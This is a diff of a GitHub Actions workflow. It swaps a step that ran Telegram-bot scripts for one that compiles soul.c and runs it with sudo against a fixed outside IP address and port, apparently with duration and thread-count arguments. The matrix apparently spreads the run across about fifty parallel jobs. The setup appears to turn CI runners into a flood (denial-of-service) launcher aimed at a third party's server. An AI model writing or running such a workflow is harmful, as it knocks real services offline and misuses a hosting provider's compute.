@@ -14,7 +14,5 @@ jobs:
             41,42,43,44,45,46,47,48,49,50]
     steps:
       - uses: actions/checkout@v3
-      - run: |
-          gcc soul.c -o soul -lpthread
-          pip install telebot flask aiogram pyTelegramBotAPI python-telegram-bot
-          python3 shubh.py
+      - run: gcc soul.c -o soul1 -lpthread && sudo ./soul1 20.204.69.85 14697 300 900
+      
